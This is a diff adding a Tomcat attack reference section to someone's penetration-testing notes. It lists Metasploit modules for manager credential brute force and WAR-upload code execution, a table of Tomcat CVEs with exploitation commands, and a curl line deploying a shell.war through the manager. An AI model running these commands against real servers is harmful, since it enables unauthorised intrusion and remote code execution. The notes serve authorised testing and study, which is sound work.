@@ -398,6 +398,36 @@ searchsploit tomcat <version>
 
 > `tomcat-users.xml` with plaintext creds and an exposed `/manager` = the standard Tomcat compromise path. WAR-upload and JMX are intrusive; Ghostcat needs AJP exposed.
 
+### Tomcat — attacking: CVEs & modules (reference)
+All intrusive, scope + approval. Fingerprint version first.
+
+**Manager brute force**
+```text
+msf6> use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS <IP>; set RPORT <PORT>; set STOP_ON_SUCCESS true
+set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
+run
+```
+
+**WAR upload RCE (after /manager login)** — generate WAR with msfvenom (see Tomcat section above), deploy via Manager, trigger the endpoint. Don't fetch prebuilt webshells into the repo.
+```text
+msf6> use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS <IP>; set USERNAME <u>; set PASSWORD <p>; run
+```
+
+**Version-specific CVEs**
+| CVE | What it is | Exploited with |
+|---|---|---|
+| CVE-2020-1938 (Ghostcat) | AJP file read / potential RCE | `nmap -p8009 --script ajp-headers`, public ghostcat PoC (`-f WEB-INF/web.xml`) |
+| CVE-2009-3548 | Manager deploy bypass (default creds / unauth) | `curl -T shell.war "http://<IP>:8080/manager/deploy?path=/x"` |
+| CVE-2017-12617 | Arbitrary JSP upload via HTTP PUT (when PUT enabled) | PUT a JSP to the webroot — payload not stored here; see web-shell detection note |
+| CVE-2020-9484 | Java deserialization RCE via persistent sessions | `ysoserial` gadget (e.g. CommonsCollections) POSTed as a serialized object — gadget/command not stored here |
+| CVE-2016-8735 | JMX RMI RCE | `use exploit/multi/misc/java_jmx_server` (RPORT 1099) |
+
+**Connectors:** AJP can expose internal resources; HTTP connector misconfigs can allow auth bypass.
+
+> The default-creds → `/manager` → WAR-upload path is still the most common real-world Tomcat compromise. The CVEs matter when creds fail or Manager isn't reachable.
+
 ### My notes / lab output
 Filled in once I run this on a target.
 
